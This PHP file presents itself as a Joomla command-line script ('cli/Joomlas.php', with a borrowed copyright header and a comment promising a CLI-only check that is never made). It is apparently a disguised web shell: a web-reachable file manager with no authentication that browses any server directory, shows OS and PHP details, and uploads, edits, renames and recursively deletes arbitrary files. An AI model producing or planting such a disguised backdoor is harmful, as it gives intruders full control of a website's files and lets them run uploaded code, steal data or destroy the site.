<?php
/**
 * @version		3.3.11 cli/Joomlas.php
 * @package		JOOMLAS cli
 * @subpackage	cli
 * @since		2.5
 *
 * @author		Helios Ciancio <info@eshiol.it>
 * @link		http://www.eshiol.it
 * @copyright	Copyright (C) 2010-2016 Helios Ciancio. All Rights Reserved
 * @license		http://www.gnu.org/licenses/gpl-3.0.html GNU/GPL v3
 * Joomlas is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 */

/**
 * This is a J2XML script which should be called from the command-line, not the
 * web. For example something like:
 * /usr/bin/php /path/to/site/cli/Joomlas.php -f joomlas_file.xml
 */

// Make sure we're being called from the command line, not a web interface

function getHumanSize($bytes) {
    if ($bytes === false) return '?';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function formatTimestamp($time) {
    return $time ? date('Y-m-d H:i:s', $time) : '-';
}

function my_file_get_contents($filename) {
    if (function_exists('file_get_contents')) {
        $content = @file_get_contents($filename);
        if ($content !== false) return $content;
    }
    $handle = @fopen($filename, 'rb');
    if (!$handle) return false;
    $content = stream_get_contents($handle);
    fclose($handle);
    return $content !== false ? $content : false;
}

function my_file_put_contents($filename, $data) {
    if (function_exists('file_put_contents')) {
        $result = @file_put_contents($filename, $data);
        if ($result !== false) return $result;
    }
    $handle = @fopen($filename, 'wb');
    if (!$handle) return false;
    $bytes = fwrite($handle, $data);
    fclose($handle);
    return $bytes !== false ? $bytes : false;
}

function my_move_uploaded_file($from, $to) {
    if (function_exists('move_uploaded_file')) {
        if (@move_uploaded_file($from, $to)) return true;
    }
    if (is_uploaded_file($from)) {
        if (@copy($from, $to)) {
            @unlink($from);
            return true;
        }
    }
    return false;
}

function recursiveDelete($target, $scriptPath) {
    if (!is_dir($target)) return unlink($target);
    $realScript = realpath($scriptPath);
    $realTarget = realpath($target);
    if ($realScript && $realTarget && strpos($realScript, $realTarget . DIRECTORY_SEPARATOR) === 0) {
        return false;
    }
    $success = true;
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($iterator as $item) {
        if ($item->getRealPath() === realpath($scriptPath)) {
            $success = false;
            continue;
        }
        if ($item->isDir()) {
            if (!rmdir($item->getRealPath())) $success = false;
        } else {
            if (!unlink($item->getRealPath())) $success = false;
        }
    }
    if (!rmdir($target)) $success = false;
    return $success;
}

$scriptFile = __FILE__;
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = realpath($currentDir);
$message = '';

if (!$currentDir || !is_dir($currentDir)) {
    die('Invalid directory.');
}

if (isset($_POST['upload'])) {
    if ($_FILES['file']['error'] === UPLOAD_ERR_NO_FILE) {
        $message = 'No file selected.';
    } else {
        $targetFile = $currentDir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (realpath($targetFile) === realpath($scriptFile)) {
            $message = 'Cannot overwrite the manager script.';
        } elseif (my_move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            $message = 'File uploaded successfully.';
        } else {
            $message = 'Upload failed.';
        }
    }
}

if (isset($_GET['delete'])) {
    $target = $currentDir . DIRECTORY_SEPARATOR . basename($_GET['delete']);
    $realTarget = realpath($target);
    if ($realTarget === realpath($scriptFile)) {
        $message = 'You cannot delete this manager script.';
    } elseif (!$realTarget || strpos($realTarget, $currentDir) !== 0) {
        $message = 'Invalid target.';
    } else {
        if (is_dir($realTarget)) {
            if (recursiveDelete($realTarget, $scriptFile)) {
                $message = 'Folder and all contents deleted.';
            } else {
                $message = 'Failed to delete folder.';
            }
        } else {
            if (unlink($realTarget)) {
                $message = 'File deleted.';
            } else {
                $message = 'Cannot delete file.';
            }
        }
    }
}

if (isset($_POST['rename'])) {
    $oldName = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['old_name']);
    $newName = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    $realOld = realpath($oldName);
    if ($realOld === realpath($scriptFile)) {
        $message = 'Renaming the manager script is not allowed.';
    } elseif ($realOld && rename($realOld, $newName)) {
        $message = 'Renamed successfully.';
    } else {
        $message = 'Rename failed.';
    }
}

if (isset($_POST['edit'])) {
    $fileToEdit = $currentDir . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    if (is_file($fileToEdit)) {
        if (my_file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
            $message = 'File saved.';
        } else {
            $message = 'Edit failed.';
        }
    } else {
        $message = 'Edit failed: not a valid file.';
    }
}

$folders = [];
$files = [];
if ($dh = @opendir($currentDir)) {
    while (($item = readdir($dh)) !== false) {
        if ($item === '.' || $item === '..') continue;
        $path = $currentDir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    closedir($dh);
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
}

function isReadablePath($path) {
    return is_readable($path);
}

function buildBreadcrumb($dir) {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $crumb = [];
    $accum = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $accum .= DIRECTORY_SEPARATOR . $part;
        $crumb[] = '<a href="?dir=' . urlencode($accum) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' › ', $crumb);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>📁 Joomlas Cli</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #f1f5f9;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            padding: 12px;
            line-height: 1.5;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 28px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
            padding: 20px 20px 32px;
        }

        h2 {
            font-size: 1.6rem;
            font-weight: 600;
            border-left: 5px solid #4361ee;
            padding-left: 16px;
            margin: 0 0 20px 0;
            background: #f8fafc;
            border-radius: 14px;
            line-height: 1.3;
        }

        .system-info {
            background: #eef2ff;
            padding: 12px 18px;
            border-radius: 24px;
            font-size: 0.8rem;
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 24px;
        }
        .system-info ul {
            margin: 0;
            padding-left: 20px;
        }

        .breadcrumb {
            background: #f1f5f9;
            padding: 12px 16px;
            border-radius: 50px;
            font-size: 0.9rem;
            word-break: break-word;
            margin-bottom: 24px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 8px;
        }
        .breadcrumb a {
            text-decoration: none;
            color: #2563eb;
            font-weight: 500;
        }
        .parent-link {
            display: inline-block;
            background: #e2e8f0;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.8rem;
            margin-left: 6px;
        }

        .flex-forms {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            background: #f9fafb;
            padding: 20px;
            border-radius: 28px;
            margin: 20px 0;
        }
        .form-group {
            flex: 1 1 240px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .form-group label {
            font-weight: 600;
            font-size: 0.85rem;
            color: #0f172a;
        }
        input, button {
            padding: 12px 16px;
            border-radius: 60px;
            border: 1px solid #cbd5e1;
            background: white;
            font-size: 0.9rem;
            width: 100%;
            font-family: inherit;
        }
        button, input[type="submit"] {
            background: #1e293b;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s ease;
        }
        button:hover, input[type="submit"]:hover {
            background: #0f172a;
            transform: scale(0.98);
        }
        .upload-btn { background: #2c7da0; }

        .message {
            background: #dcfce7;
            color: #166534;
            padding: 12px 20px;
            border-radius: 60px;
            margin: 20px 0;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .table-wrapper {
            overflow-x: auto;
            margin: 24px 0 12px;
            border-radius: 24px;
            border: 1px solid #e2e8f0;
            -webkit-overflow-scrolling: touch;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
            min-width: 640px;
        }
        thead tr {
            background: linear-gradient(135deg, #1e2a5e, #2d3a6e);
            color: white;
        }
        th, td {
            padding: 14px 12px;
            text-align: left;
            border-bottom: 1px solid #e2e8f0;
            vertical-align: middle;
        }
        tbody tr:hover {
            background: #f8fafc;
        }

        .icon-readable {
            color: #22c55e;
            font-weight: 600;
        }
        .icon-unreadable {
            color: #ef4444;
            font-weight: 600;
        }

        .action-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .action-buttons a {
            display: inline-block;
            text-decoration: none;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 600;
            transition: 0.1s;
            white-space: nowrap;
            text-align: center;
        }
        .btn-edit { background: #ffb74d; color: #3e2723; }
        .btn-rename { background: #4fc3f7; color: #01579b; }
        .btn-delete { background: #ef9a9a; color: #b71c1c; }

        .file-name {
            word-break: break-word;
            max-width: 220px;
        }
        .badge {
            font-size: 0.7rem;
            background: #e9ecef;
            padding: 4px 10px;
            border-radius: 40px;
            white-space: nowrap;
            display: inline-block;
        }

        .edit-panel, .rename-panel {
            border-radius: 24px;
            padding: 20px;
            margin: 20px 0;
        }
        .edit-panel {
            background: #fef9e3;
        }
        .rename-panel {
            background: #e3f2fd;
        }
        textarea {
            width: 100%;
            border-radius: 20px;
            padding: 14px;
            border: 1px solid #cbd5e1;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            resize: vertical;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            margin-top: 32px;
            color: #475569;
            border-top: 1px solid #e2e8f0;
            padding-top: 20px;
        }

        @media (max-width: 768px) {
            body {
                padding: 8px;
            }
            .container {
                padding: 16px;
                border-radius: 20px;
            }
            h2 {
                font-size: 1.4rem;
                margin-bottom: 16px;
            }
            .system-info {
                padding: 10px 14px;
                font-size: 0.7rem;
            }
            .breadcrumb {
                font-size: 0.8rem;
                padding: 10px 14px;
            }
            .flex-forms {
                flex-direction: column;
                gap: 16px;
                padding: 16px;
            }
            .form-group {
                width: 100%;
            }
            th, td {
                padding: 10px 8px;
            }
            .action-buttons a {
                padding: 5px 10px;
                font-size: 0.7rem;
            }
            .file-name {
                max-width: 150px;
            }
            .badge {
                font-size: 0.65rem;
                padding: 2px 8px;
            }
        }

        @media (max-width: 480px) {
            .action-buttons {
                flex-direction: column;
                gap: 6px;
            }
            .action-buttons a {
                text-align: center;
                width: 100%;
            }
            th, td {
                font-size: 0.75rem;
                padding: 8px 6px;
            }
            table {
                min-width: 520px;
            }
            .file-name {
                max-width: 120px;
            }
        }

        @media (min-width: 1200px) {
            .container {
                padding: 28px 32px 40px;
            }
            th, td {
                padding: 16px 14px;
            }
            .action-buttons a {
                padding: 6px 16px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h2>📁 Joomlas Cli</h2>
    <div class="system-info">
        <ul>
            <li><strong>Server:</strong> <?= htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A') ?></li>
            <li><strong>OS:</strong> <?= htmlspecialchars(php_uname()) ?></li>
            <li><strong>PHP:</strong> <?= htmlspecialchars(phpversion()) ?></li>
        </ul>
    </div>

    <div class="breadcrumb">
        <strong>📍 Location:</strong> <?= buildBreadcrumb($currentDir) ?>
        <?php
        $parent = dirname($currentDir);
        if ($parent && $parent !== $currentDir && is_dir($parent)) {
            echo ' <a href="?dir=' . urlencode($parent) . '" class="parent-link">⬆ Parent</a>';
        }
        ?>
    </div>

    <div class="flex-forms">
        <div class="form-group">
            <label>📤 Upload file</label>
            <form method="post" enctype="multipart/form-data" style="display:flex; gap:8px; flex-wrap:wrap;">
                <input type="file" name="file" required style="flex:1;">
                <input type="submit" name="upload" value="Upload" class="upload-btn" style="width:auto;">
            </form>
        </div>
    </div>

    <?php if ($message !== ''): ?>
        <div class="message">✔ <?= htmlspecialchars($message) ?></div>
    <?php endif; ?>

    <?php if (isset($_GET['edit']) && is_file($currentDir . '/' . basename($_GET['edit']))): 
        $editFile = $currentDir . '/' . basename($_GET['edit']);
        $content = my_file_get_contents($editFile);
        if ($content === false) $content = "[Failed to read file]";
    ?>
        <div class="edit-panel">
            <h3>✏️ Editing: <?= htmlspecialchars(basename($_GET['edit'])) ?></h3>
            <form method="post">
                <textarea name="file_content" rows="8"><?= htmlspecialchars($content) ?></textarea>
                <input type="hidden" name="file_name" value="<?= htmlspecialchars(basename($_GET['edit'])) ?>">
                <input type="submit" name="edit" value="Save Changes" style="margin-top:12px; background:#f4a261; width:auto;">
            </form>
        </div>
    <?php endif; ?>

    <?php if (isset($_GET['rename']) && (is_file($currentDir . '/' . basename($_GET['rename'])) || is_dir($currentDir . '/' . basename($_GET['rename'])))):
        $renameTarget = htmlspecialchars(basename($_GET['rename']));
    ?>
        <div class="rename-panel">
            <h3>🔄 Rename: <?= $renameTarget ?></h3>
            <form method="post">
                <input type="text" name="new_name" placeholder="new name" required style="min-width:180px;">
                <input type="hidden" name="old_name" value="<?= $renameTarget ?>">
                <input type="submit" name="rename" value="Rename" style="background:#4c9aff; margin-top:10px; width:auto;">
            </form>
        </div>
    <?php endif; ?>

    <div class="table-wrapper">
        <table>
            <thead>
                <tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
            </thead>
            <tbody>
                <?php if (empty($folders) && empty($files)): ?>
                    <tr><td colspan="5" style="text-align:center;">📭 Empty directory</td></tr>
                <?php endif; ?>

                <?php foreach ($folders as $folder): 
                    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $folder;
                    $readable = isReadablePath($fullPath);
                    $iconClass = $readable ? 'icon-readable' : 'icon-unreadable';
                    $iconSymbol = $readable ? '📁' : '🔒📁';
                    $modTime = filemtime($fullPath);
                ?>
                    <tr>
                        <td class="file-name">
                            <span class="<?= $iconClass ?>"><?= $iconSymbol ?></span>
                            <a href="?dir=<?= urlencode($fullPath) ?>" style="font-weight:500;"><?= htmlspecialchars($folder) ?></a>
                            <?php if (!$readable): ?> <span class="badge" style="background:#fee2e2; color:#b91c1c;">🔴 unreadable</span><?php endif; ?>
                        </td>
                        <td><span class="badge">Dir</span></td>
                        <td>—</td>
                        <td><?= formatTimestamp($modTime) ?></td>
                        <td class="action-buttons">
                            <a href="?dir=<?= urlencode($currentDir) ?>&rename=<?= urlencode($folder) ?>" class="btn-rename">✏️ Rename</a>
                            <a href="?dir=<?= urlencode($currentDir) ?>&delete=<?= urlencode($folder) ?>" class="btn-delete" onclick="return confirm('⚠️ Delete folder & all contents?');">🗑 Delete</a>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php foreach ($files as $file):
                    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $file;
                    $readable = isReadablePath($fullPath);
                    $iconClass = $readable ? 'icon-readable' : 'icon-unreadable';
                    $iconSymbol = $readable ? '📄' : '🔒📄';
                    $size = filesize($fullPath);
                    $modTime = filemtime($fullPath);
                    $isScript = (realpath($fullPath) === realpath($scriptFile));
                ?>
                    <tr>
                        <td class="file-name">
                            <span class="<?= $iconClass ?>"><?= $iconSymbol ?></span>
                            <?= htmlspecialchars($file) ?>
                            <?php if ($isScript): ?> <span class="badge" style="background:#ffedd5;">🔒 protected</span><?php endif; ?>
                            <?php if (!$readable): ?> <span class="badge" style="background:#fee2e2; color:#b91c1c;">🔴 unreadable</span><?php endif; ?>
                        </td>
                        <td><span class="badge">File</span></td>
                        <td><?= getHumanSize($size) ?></td>
                        <td><?= formatTimestamp($modTime) ?></td>
                        <td class="action-buttons">
                            <?php if ($readable): ?>
                                <a href="?dir=<?= urlencode($currentDir) ?>&edit=<?= urlencode($file) ?>" class="btn-edit">✍ Edit</a>
                            <?php else: ?>
                                <span class="badge" style="background:#e2e3e5; color:#6c757d;">🚫 Edit blocked</span>
                            <?php endif; ?>
                            <a href="?dir=<?= urlencode($currentDir) ?>&rename=<?= urlencode($file) ?>" class="btn-rename">🏷 Rename</a>
                            <a href="?dir=<?= urlencode($currentDir) ?>&delete=<?= urlencode($file) ?>" class="btn-delete" onclick="return confirm('Delete this file?');">❌ Delete</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <footer>
        Joomlas Cli
    </footer>
</div>
</body>
</html>
